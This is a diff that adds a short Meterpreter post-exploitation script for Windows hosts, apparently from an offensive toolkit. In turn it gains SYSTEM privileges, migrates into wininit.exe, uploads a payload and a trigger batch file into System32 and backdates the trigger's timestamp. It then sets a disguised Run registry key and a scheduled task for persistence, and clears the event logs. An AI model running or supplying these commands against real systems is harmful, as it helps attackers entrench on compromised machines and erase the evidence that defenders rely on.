@@ -1,0 +1,8 @@
+getsystem
+run migrate -n wininit.exe
+upload IPATH/output/N4m %windir%\\System32\\N4m
+upload IPATH/output/trigger.bat %windir%\\System32\\trigger.bat
+timestomp -z '3/10/1999 15:15:15' %windir%\\System32\\trigger.bat
+reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v pWeDtReOr -d %windir%\System32\trigger.bat
+run scheduleme -hr M1P -c "%windir%\\System32\\trigger.bat"
+clearev
